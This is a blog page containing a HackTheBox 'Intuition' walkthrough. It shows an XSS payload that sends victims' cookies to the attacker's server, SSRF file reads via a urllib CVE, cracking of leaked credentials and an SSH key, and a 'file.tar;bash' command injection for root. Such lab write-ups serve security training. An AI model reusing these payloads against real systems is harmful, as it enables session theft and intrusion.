<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Intuition Writeup - HackTheBox | Rezy Dev</title>
<meta name="keywords" content="HackTheBox, Linux, Hard">
<meta name="description" content="Intuition is a Hard Linux machine highlighting a CSRF (Cross-Site Request Forgery) attack during the initial foothold, along with several other intriguing attack vectors. To gain a foothold, you must first exploit a CSRF vulnerability, followed by exploiting [CVE-2023-24329](https://github.com/python/cpython/issues/102153) in the Python `urllib` module to access files on the server. This allows you to disclose the application&#39;s source code, leading to the discovery of credentials needed to access the FTP server via an LFI (Local File Inclusion) vulnerability. Once inside the box, you must perform log analysis to progress to the next user and conduct a code review combined with a small amount of scripting. To achieve root access, you need to reverse engineer and exploit a custom binary, which is then leveraged to exploit [CVE-2023-5115](https://nvd.nist.gov/vuln/detail/CVE-2023-5115), a path traversal attack in the Ansible automation platform.">
<meta name="author" content="Me">
<link rel="canonical" href="http://localhost:1313/posts/writeups/hackthebox/intuition/">
<meta name="google-site-verification" content="XYZabc">
<meta name="yandex-verification" content="XYZabc">
<meta name="msvalidate.01" content="XYZabc">
<link crossorigin="anonymous" href="/assets/css/stylesheet.dedc6f28e91e91324ecfccf7c36e0bac426c203d8e6217a97f0064ab55f9a7cf.css" integrity="sha256-3txvKOkekTJOz8z3w24LrEJsID2OYhepfwBkq1X5p88=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/writeups/hackthebox/intuition/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:url" content="http://localhost:1313/posts/writeups/hackthebox/intuition/">
  <meta property="og:site_name" content="Rezy Dev">
  <meta property="og:title" content="Intuition Writeup - HackTheBox">
  <meta property="og:description" content="Intuition is a Hard Linux machine highlighting a CSRF (Cross-Site Request Forgery) attack during the initial foothold, along with several other intriguing attack vectors. To gain a foothold, you must first exploit a CSRF vulnerability, followed by exploiting [CVE-2023-24329](https://github.com/python/cpython/issues/102153) in the Python `urllib` module to access files on the server. This allows you to disclose the application&#39;s source code, leading to the discovery of credentials needed to access the FTP server via an LFI (Local File Inclusion) vulnerability. Once inside the box, you must perform log analysis to progress to the next user and conduct a code review combined with a small amount of scripting. To achieve root access, you need to reverse engineer and exploit a custom binary, which is then leveraged to exploit [CVE-2023-5115](https://nvd.nist.gov/vuln/detail/CVE-2023-5115), a path traversal attack in the Ansible automation platform.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-09-15T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-09-15T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Linux">
    <meta property="article:tag" content="Hard">
      <meta property="og:image" content="http://localhost:1313/posts/writeups/hackthebox/intuition/feature.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://localhost:1313/posts/writeups/hackthebox/intuition/feature.png">
<meta name="twitter:title" content="Intuition Writeup - HackTheBox">
<meta name="twitter:description" content="Intuition is a Hard Linux machine highlighting a CSRF (Cross-Site Request Forgery) attack during the initial foothold, along with several other intriguing attack vectors. To gain a foothold, you must first exploit a CSRF vulnerability, followed by exploiting [CVE-2023-24329](https://github.com/python/cpython/issues/102153) in the Python `urllib` module to access files on the server. This allows you to disclose the application&#39;s source code, leading to the discovery of credentials needed to access the FTP server via an LFI (Local File Inclusion) vulnerability. Once inside the box, you must perform log analysis to progress to the next user and conduct a code review combined with a small amount of scripting. To achieve root access, you need to reverse engineer and exploit a custom binary, which is then leveraged to exploit [CVE-2023-5115](https://nvd.nist.gov/vuln/detail/CVE-2023-5115), a path traversal attack in the Ansible automation platform.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Writeups",
      "item": "http://localhost:1313/posts/writeups/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "HackTheBox",
      "item": "http://localhost:1313/posts/writeups/hackthebox/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "Intuition Writeup - HackTheBox",
      "item": "http://localhost:1313/posts/writeups/hackthebox/intuition/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Intuition Writeup - HackTheBox",
  "name": "Intuition Writeup - HackTheBox",
  "description": "Intuition is a Hard Linux machine highlighting a CSRF (Cross-Site Request Forgery) attack during the initial foothold, along with several other intriguing attack vectors. To gain a foothold, you must first exploit a CSRF vulnerability, followed by exploiting [CVE-2023-24329](https://github.com/python/cpython/issues/102153) in the Python `urllib` module to access files on the server. This allows you to disclose the application's source code, leading to the discovery of credentials needed to access the FTP server via an LFI (Local File Inclusion) vulnerability. Once inside the box, you must perform log analysis to progress to the next user and conduct a code review combined with a small amount of scripting. To achieve root access, you need to reverse engineer and exploit a custom binary, which is then leveraged to exploit [CVE-2023-5115](https://nvd.nist.gov/vuln/detail/CVE-2023-5115), a path traversal attack in the Ansible automation platform.",
  "keywords": [
    "HackTheBox", "Linux", "Hard"
  ],
  "articleBody": " Link: https://app.hackthebox.com/machines/Intuition Difficulty Hard Machine Linux Enumeration Nmap Scan I started with an Nmap scan to identify open ports on the target machine. The scan revealed two open ports:\nPort 22: SSH Port 80: HTTP Next, I conducted an aggressive scan to gather more detailed information about the services running on these ports. The results provided insights into potential vulnerabilities and configurations that could be exploited.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLS2jzf8Eqy8cVa20hyZcem8rwAzeRhrMNEGdSUcFmv1FiQsfR4F9vZYkmfKViGIS3uL3X/6sJjzGxT1F/uPm/U= | 256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFj9hE1zqO6TQ2JpjdgvMm6cr6s6eYsQKWlROV4G6q+4 80/tcp open http syn-ack nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://comprezzor.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel When I navigated to the web service running on port 80, I was greeted with the initial site. This gave me a first look at the target‚Äôs web interface and allowed me to begin assessing potential entry points or vulnerabilities in the web application.\nDuring my exploration, I discovered several subdomains associated with the target:\nreport.comprezzor.htb auth.comprezzor.htb dashboard.comprezzor.htb (requires login as an authorized user) User Flag To gain unauthorized access, I decided to attempt stealing cookies using a cross-site scripting (XSS) vulnerability. I used the bug report form on report.comprezzor.htb for this purpose. Here is the payload I used:\n\u003cscript\u003evar i=new Image(); i.src=\"http://10.10.14.102:80/?cookie=\"+btoa(document.cookie);\u003c/script\u003e This payload successfully captured the cookie by sending the cookie data to my server at http://10.10.14.102. With this session cookie, I could potentially access restricted areas like dashboard.comprezzor.htb, demonstrating a significant security flaw that could be exploited for further penetration testing.\nAfter countless attempts and troubleshooting, I finally managed to capture the session cookie. This involved restarting the processes and refining my methods multiple times, but persistence paid off.\n10.129.54.146 - - [28/Apr/2024 11:51:15] \"GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1\" 404 - 10.129.54.146 - - [28/Apr/2024 11:51:15] code 404, message File not found 10.129.54.146 - - [28/Apr/2024 11:51:15] \"GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1\" 404 - Using the stolen cookie, I accessed the ‚ÄúCreate PDF Report‚Äù site. From here, I executed a Server-Side Request Forgery (SSRF) attack by manipulating the report URL to send a request to my own HTTP server. This allowed me to intercept and analyze the server‚Äôs response.\nThrough this SSRF attack, I received a new cookie:\neyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRzZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5 By leveraging the SSRF vulnerability, I noticed that the reply contained the following user agent:\nUser-Agent: Python-urllib/3.11 This indicated that the application might be using a Python script to handle requests. Recognizing the potential for exploitation, I researched and found relevant exploits, including one discussed in this GitHub issue.\nUtilizing this CVE, I managed to retrieve the source code of the application via the SSRF attack. Access to the source code provided valuable insights into the internal workings of the application, including potential vulnerabilities and misconfigurations.\nUsing the SSRF vulnerability, I targeted the specific path where the application code was likely stored. By sending a request to fetch python3/app/code/app.py, I successfully retrieved the source code of the Flask application.\nBy analyzing the source code retrieved from python3/app/code/app.py, I developed a blueprint to help navigate and identify interesting components within the application. This blueprint focused on key areas such as routes, functions, and any hardcoded sensitive information.\nproject_folder/ ‚îÇ ‚îú‚îÄ‚îÄ app.py ‚îÇ ‚îú‚îÄ‚îÄ blueprints/ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ index/ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ index.py ‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ report/ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ report.py ‚îÇ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ auth/ ‚îÇ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ auth.py ‚îÇ ‚îÇ ‚îÇ ‚îî‚îÄ‚îÄ dashboard/ ‚îÇ ‚îú‚îÄ‚îÄ __init__.py ‚îÇ ‚îî‚îÄ‚îÄ dashboard.py ‚îÇ ‚îî‚îÄ‚îÄ static/ ‚îú‚îÄ‚îÄ css/ ‚îú‚îÄ‚îÄ js/ ‚îî‚îÄ‚îÄ ... With the useful code extracted from dashboard.py using the SSRF vulnerability, we can analyze it to identify critical functionalities, potential vulnerabilities, and further actions for exploitation.\ntry: ftp = FTP('ftp.local') ftp.login(user='ftp_admin', passwd='u3jai8y71s2') ftp.cwd('/') with open(backup_filename, 'rb') as file: ftp.storbinary(f'STOR {backup_filename}', file) ftp.quit() os.remove(backup_filename) flash('Backup and upload completed successfully!', 'success') except Exception as e: flash(f'Error: {str(e)}', 'error') return redirect(url_for('dashboard.dashboard')) In the code above, I noticed FTP credentials. I‚Äôll utilize the SSRF method to connect to this FTP.\nftp://ftp_admin:u3jai8y71s2@ftp.local/ I used the FTP credentials as an SSRF payload from the previous step. We observed there is a private key. I attempt to view it.\nWith this payload, I will attempt to view the private key located at the following FTP URL: ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key.\n-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA KK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7 x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BR BdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JX U0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQk TlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+ efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbc JFGDBQ+X3QelEAAAWQ+YGB02Ep/88YxudrpfK8MjnpV50/Ew4KtvEjqe4oNL4zLr4qpRec 80EVZXE2y8k7+2Kqe9+i65RDTpTv+D88M4p/x0wOSVoquD3NNKDSDCmuo0+EU+5WrZcLGT ybB8rzzM+RZTm2/XqXvrPPKqtZ9jGIVWhzOirVmbr7lU9reyyotru1RrFDrKSZB4Rju/6V YMLzlQ0hG+558YqQ/VU1wrcViqMCAHoKo+kxYBhvA7Pq1XDtU1vLJRhQikg249Iu4NnPtA bS5NY4W5E0myaT6sj1Nb7GMlU9aId+PQLxwfPzHvmZArlZBl2EdwOrH4K6Acl/WX2Gchia R9Rb3vhhJ9fAP10cmKCGNRXUHgAw3LS/xXbskoaamN/Vj9CHqF1ciEswr0STURBgN4OUO7 cEH6cOmv7/blKgJUM/9/lzQ0VSCoBiFkje9BEQ5UFgZod+Lw5UVW5JrkHrO4NHZmJR7epT 9e+7RTOJW1rKq6xf4WmTbEMV95TKAu1BIfSPJgLAO25+RF4fGJj+A3fnIB0aDmFmT4qiiz YyJUQumFsZDRxaFCWSsGaTIdZSPzXm1lB0fu3fI1gaJ+73Aat9Z4+BrwxOrQeoSjj6nAJa lPmLlsKmOE+50l+kB2OBuqssg0kQHgPmiI+TMBAW71WU9ce5Qpg7udDVPrbkFPiEn7nBxO JJEKO4U29k93NK1FJNDJ8VI3qqqDy6GMziNapOlNTsWqRf5mCSWpbJu70LE32Ng5IqFGCu r4y/3AuPTgzCQUt78p0NbaHTB8eyOpRwoGvKUQ10XWaFO5IVWlZ3O5Q1JB1vPkxod6YOAk wsOvp4pZK/FPi165tghhogsjbKMrkTS1+RVLhhDIraNnpay2VLMOq8U4pcVYbg0Mm0+Qeh FYsktA4nHEX5EmURXO2WZgQThZrvfsEK5EIPKFMM7BSiprnoapMMFzKAwAh1D8rJlDsgG/ Lnw6FPnlUHoSZU4yi8oIras0zYHOQjiPToRMBQQPLcyBUpZwUv/aW8I0BuQv2bbfq5X6QW 1VjanxEJQau8dOczeWfG55R9TrF+ZU3G27UZVt4mZtbwoQipK71hmKDraWEyqp+cLmvIRu eIIIcWPliMi9t+c3mI897sv45XWUkBfv6kNmfs1l9BH/GRrD+JYlNFzpW1PpdbnzjNHHZ3 NL4dUe3Dt5rGyQF8xpBm3m8H/0bt4AslcUL9RsyXvBK26BIdkqoZHKNyV9xlnIktlVELaZ XTrhQOEGC4wqxRSz8BUZOb1/5Uw/GI/cYabJdsvb/QKxGbm5pBM7YRAgmljYExjDavczU4 AEuCbdj+D8zqvuXgIFlAdgen8ppBob0/CBPqE5pTsuAOe3SdEqEvglTrb+rlgWC6wPSvaA rRgthH/1jct9AgmgDd2NntTwi9iXPDqtdx7miMslOIxKJidiR5wg5n4Dl6l5cL+ZN7dT/N KdMz9orpA/UF+sBLVMyfbxoPF3Mxz1SG62lVvH45d7qUxjJe5SaVoWlICsDjogfHfZY40P bicrjPySOBdP2oa4Tg8emN1gwhXbxh1FtxCcahOrmQ5YfmJLiAFEoHqt08o00nu8ZfuXuI 9liglfvSvuOGwwDcsv5aVk+DLWWUgWkjGZcwKdd9qBbOOCOKSOIgyZALdLb5kA2yJQ1aZl nEKhrdeHTe4Q+HZXuBSCbXOqpOt9KZwZuj2CB27yGnVBAP+DOYVAbbM5LZWvXP+7vb7+BW ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6 XxwXArPr6+HQe9hZSjI2hjYC2OU= -----END OPENSSH PRIVATE KEY----- There is also a passphrase ‚ÄúY27SH19HDIWD‚Äù on the FTP server, which we can retrieve using the following payload:\nreport_url=++++ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt\nNow I will execute ssh-add to extract the username from the id_rsa file.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~/s5] ‚îî‚îÄ$ ssh-add id_rsa Enter passphrase for id_rsa: Identity added: id_rsa (dev_acc@local) It indicates that the user is dev_acc. Now, I will SSH to the user using the command: ssh dev_acc@10.129.54.146 -i id_rsa.\nWe successfully obtained the user flag! üö©\nRoot Flag Now, I‚Äôll run LinPEAS by fetching it from my host system using a HTTP server created with Python.\n‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Users with console adam:x:1002:1002:,,,:/home/adam:/bin/bash dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash lopez:x:1003:1003:,,,:/home/lopez:/bin/bash root:x:0:0:root:/root:/bin/bash After LinPEAS finished running, I made note of the users in case we might need them later.\nAdditionally, I found a users.db file in the blueprints directory. I will view its contents using cat to see if we can gather any information.\nThe users.db file contains a hash for the user ‚Äúadam‚Äù. We can attempt to crack it using hashcat, John the Ripper, or any other preferred tool.\nÔøΩÔøΩÔøΩÔøΩP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)ÔøΩ3ÔøΩEtableusersusersCREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL, role TEXT DEFAULT 'user' ,ÔøΩ,##wÔøΩÔøΩhÔøΩ=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevhÔøΩ=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ After cracking the hash for user ‚Äúadam‚Äù using hashcat with the command:\nhashcat.exe -m 30120 myhash.txt rockyou.txt The credentials for user ‚Äúadam‚Äù are:\nusername: adam password: adam gray I conducted further enumeration and discovered valid credentials for another user.\ndev_acc@intuition:/$ zgrep -i lopez /var/log/suricata/*.gz /var/log/suricata/eve.json.7.gz:{\"timestamp\":\"2023-09-28T17:43:36.099184+0000\",\"flow_id\":1988487100549589,\"in_iface\":\"ens33\",\"event_type\":\"ftp\",\"src_ip\":\"192.168.227.229\",\"src_port\":37522,\"dest_ip\":\"192.168.227.13\",\"dest_port\":21,\"proto\":\"TCP\",\"tx_id\":1,\"community_id\":\"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=\",\"ftp\":{\"command\":\"USER\",\"command_data\":\"lopez\",\"completion_code\":[\"331\"],\"reply\":[\"Username ok, send password.\"],\"reply_received\":\"yes\"}} /var/log/suricata/eve.json.7.gz:{\"timestamp\":\"2023-09-28T17:43:52.999165+0000\",\"flow_id\":1988487100549589,\"in_iface\":\"ens33\",\"event_type\":\"ftp\",\"src_ip\":\"192.168.227.229\",\"src_port\":37522,\"dest_ip\":\"192.168.227.13\",\"dest_port\":21,\"proto\":\"TCP\",\"tx_id\":2,\"community_id\":\"1:SLaZvboBWDjwD/SXu/SOOcdHzV8=\",\"ftp\":{\"command\":\"PASS\",\"command_data\":\"Lopezzz1992%123\",\"completion_code\":[\"530\"],\"reply\":[\"Authentication failed.\"],\"reply_received\":\"yes\"}} /var/log/suricata/eve.json.7.gz:{\"timestamp\":\"2023-09-28T17:44:32.133372+0000\",\"flow_id\":1218304978677234,\"in_iface\":\"ens33\",\"event_type\":\"ftp\",\"src_ip\":\"192.168.227.229\",\"src_port\":45760,\"dest_ip\":\"192.168.227.13\",\"dest_port\":21,\"proto\":\"TCP\",\"tx_id\":1,\"community_id\":\"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=\",\"ftp\":{\"command\":\"USER\",\"command_data\":\"lopez\",\"completion_code\":[\"331\"],\"reply\":[\"Username ok, send password.\"],\"reply_received\":\"yes\"}} /var/log/suricata/eve.json.7.gz:{\"timestamp\":\"2023-09-28T17:44:48.188361+0000\",\"flow_id\":1218304978677234,\"in_iface\":\"ens33\",\"event_type\":\"ftp\",\"src_ip\":\"192.168.227.229\",\"src_port\":45760,\"dest_ip\":\"192.168.227.13\",\"dest_port\":21,\"proto\":\"TCP\",\"tx_id\":2,\"community_id\":\"1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=\",\"ftp\":{\"command\":\"PASS\",\"command_data\":\"Lopezz1992%123\",\"completion_code\":[\"230\"],\"reply\":[\"Login successful.\"],\"reply_received\":\"yes\"}} I obtained the password for user ‚Äúlopez.‚Äù It is Lopezz1992%123. I used this password to access the account of user ‚Äúlopez.‚Äù\nI also gained access to FTP using:\nlopez@intuition:~$ ftp adam@127.0.0.1 Connected to 127.0.0.1. 220 pyftpdlib 1.5.7 ready. 331 Username ok, send password. Password: adam gray 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls I retrieved all the cool stuff from there using the get command:\npayload.txt runner1 runner1.c run-tests.sh The ‚Äúrun-tests.sh‚Äù file contains:\n#!/bin/bash # List playbooks ./runner1 list # Run playbooks [Need authentication] # ./runner run [playbook number] -a [auth code] #./runner1 run 1 -a \"UHI75GHI****\" # Install roles [Need authentication] # ./runner install [role url] -a [auth code] #./runner1 install http://role.host.tld/role.tar -a \"UHI75GHI****\" The ‚Äúrunner1.c‚Äù file contains the authentication code, but it‚Äôs hashed in MD5. I will save it somewhere naming myhash.txt.\nI cracked the auth code from run-tests.sh file using the following command as we knew the first part of the authentication key **UHI75GHI******and the hash was available in runner1.c:\nhashcat.exe -a3 -m0 myhash.txt UHI75GHI?u?u?u?u --self-test-disable The cracked hash is UHI75GHINKOP.\nI created a file named ‚Äúexploit.json‚Äù containing:\n{ \"run\":{ \"action\":\"install\", \"role_file\":\"file.tar\" }, \"auth_code\":\"UHI75GHINKOP\" } We know the injection point is role_file. We need to perform command injection from role_file now. I renamed my file from file.tar to file.tar;bash. Now, I will adjust the payload in exploit.json accordingly.\n{ \"run\":{ \"action\":\"install\", \"role_file\":\"file.tar;bash\" }, \"auth_code\":\"UHI75GHINKOP\" } I ran sudo /opt/runner2/runner2 exploit.json again.\nroot@intuition:/home/lopez# cd ~ root@intuition:~# cat root.txt [ROOT_FLAG_R3DACT3D] root@intuition:~# id uid=0(root) gid=0(root) groups=0(root) Boom! We now have root access. üéâüöÄ\nConclusion Thanks for following along with my walkthrough! Using various tools and techniques, we successfully identified vulnerabilities, exploited them, and gained root access. Keep exploring and happy hacking!\n",
  "wordCount" : "1319",
  "inLanguage": "en",
  "image": "http://localhost:1313/posts/writeups/hackthebox/intuition/feature.png","datePublished": "2024-09-15T00:00:00Z",
  "dateModified": "2024-09-15T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Me"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/writeups/hackthebox/intuition/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Rezy Dev",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/posts/" title="‚úçÔ∏è Posts">
                    <span>‚úçÔ∏è Posts</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="üîç Search">
                    <span>üîç Search</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="üè∑Ô∏è Tags">
                    <span>üè∑Ô∏è Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/whoami/" title="üë®üèº‚Äçüíª Whoami">
                    <span>üë®üèº‚Äçüíª Whoami</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/posts/">Posts</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/posts/writeups/">Writeups</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/posts/writeups/hackthebox/">HackTheBox</a></div>
    <h1 class="post-title entry-hint-parent">
      Intuition Writeup - HackTheBox
    </h1>
    <div class="post-description">
      Intuition is a Hard Linux machine highlighting a CSRF (Cross-Site Request Forgery) attack during the initial foothold, along with several other intriguing attack vectors. To gain a foothold, you must first exploit a CSRF vulnerability, followed by exploiting [CVE-2023-24329](https://github.com/python/cpython/issues/102153) in the Python `urllib` module to access files on the server. This allows you to disclose the application&#39;s source code, leading to the discovery of credentials needed to access the FTP server via an LFI (Local File Inclusion) vulnerability. Once inside the box, you must perform log analysis to progress to the next user and conduct a code review combined with a small amount of scripting. To achieve root access, you need to reverse engineer and exploit a custom binary, which is then leveraged to exploit [CVE-2023-5115](https://nvd.nist.gov/vuln/detail/CVE-2023-5115), a path traversal attack in the Ansible automation platform.
    </div>
    <div class="post-meta"><span title='2024-09-15 00:00:00 +0000 UTC'>September 15, 2024</span>&nbsp;¬∑&nbsp;7 min&nbsp;¬∑&nbsp;1319 words&nbsp;¬∑&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/posts/writeups/HackTheBox/Intuition/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#enumeration">Enumeration</a>
      <ul>
        <li><a href="#nmap-scan"><strong>Nmap Scan</strong></a></li>
      </ul>
    </li>
    <li><a href="#user-flag">User Flag</a></li>
    <li><a href="#root-flag">Root Flag</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><table>
  <thead>
      <tr>
          <th>Link:</th>
          <th><a href="https://app.hackthebox.com/machines/Intuition">https://app.hackthebox.com/machines/Intuition</a></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>Difficulty</td>
          <td>Hard</td>
      </tr>
      <tr>
          <td>Machine</td>
          <td>Linux</td>
      </tr>
  </tbody>
</table>
<hr>
<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
<h3 id="nmap-scan"><strong>Nmap Scan</strong><a hidden class="anchor" aria-hidden="true" href="#nmap-scan">#</a></h3>
<p>I started with an Nmap scan to identify open ports on the target machine. The scan revealed two open ports:</p>
<ul>
